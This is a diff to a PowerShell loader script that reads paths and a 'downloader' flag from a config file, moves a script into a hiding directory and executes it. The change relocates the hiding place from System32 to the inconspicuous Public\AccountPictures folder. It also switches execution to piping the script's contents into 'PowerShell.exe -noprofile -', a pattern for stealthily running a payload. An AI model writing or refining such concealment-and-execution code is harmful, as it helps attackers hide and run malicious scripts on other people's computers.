@@ -9,7 +9,7 @@ if (!(Test-Path ".\config.txt")) {
 $SCRIPT_PATH = (Get-Content -Path .\config.txt -TotalCount 1)[-1]
 $WORKING_DIR = (Get-Content -Path .\config.txt -TotalCount 2)[-1]
 $DOWNLOADER  = (Get-Content -Path .\config.txt -TotalCount 3)[-1]
-$HIDE_DIR    = "C:\WINDOWS\System32"
+$HIDE_DIR    = "C:\Users\Public\AccountPictures"
 
 cd $WORKING_DIR
 
@@ -23,4 +23,5 @@ if ($DOWNLOADER -eq "downloader.TRUE") {
 
 Move-Item $SCRIPT_PATH -Destination $HIDE_DIR
 cd $HIDE_DIR
-Invoke-Item -Path $SCRIPT_PATH
+
+Get-Content $SCRIPT_PATH | PowerShell.exe -noprofile -
